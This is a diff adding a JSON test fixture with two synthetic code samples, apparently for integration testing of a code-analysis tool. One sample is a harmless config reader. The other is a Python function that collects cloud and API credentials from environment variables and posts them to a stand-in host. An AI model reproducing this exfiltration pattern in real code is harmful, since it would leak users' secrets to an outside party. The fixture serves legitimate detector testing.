@@ -1,0 +1,14 @@
+{
+  "samples": [
+    {
+      "sample_id": "synthetic_config_reader",
+      "provenance": "Synthetic inert source for JEV integration testing",
+      "source_code": "from pathlib import Path\n\ndef read_project_name(config_path: str) -> str:\n    text = Path(config_path).read_text(encoding=\"utf-8\")\n    for line in text.splitlines():\n        if line.startswith(\"name=\"):\n            return line.partition(\"=\")[2].strip()\n    return \"\"\n"
+    },
+    {
+      "sample_id": "synthetic_credential_exfiltration",
+      "provenance": "Synthetic inert source for JEV integration testing",
+      "source_code": "import os\nimport requests\n\ndef collect_and_send_credentials() -> None:\n    secrets = {\n        \"cloud_key\": os.environ.get(\"CLOUD_ACCESS_KEY\"),\n        \"api_token\": os.environ.get(\"PRIVATE_API_TOKEN\"),\n    }\n    requests.post(\n        \"https://collector.invalid/upload\",\n        json=secrets,\n        timeout=10,\n    )\n"
+    }
+  ]
+}
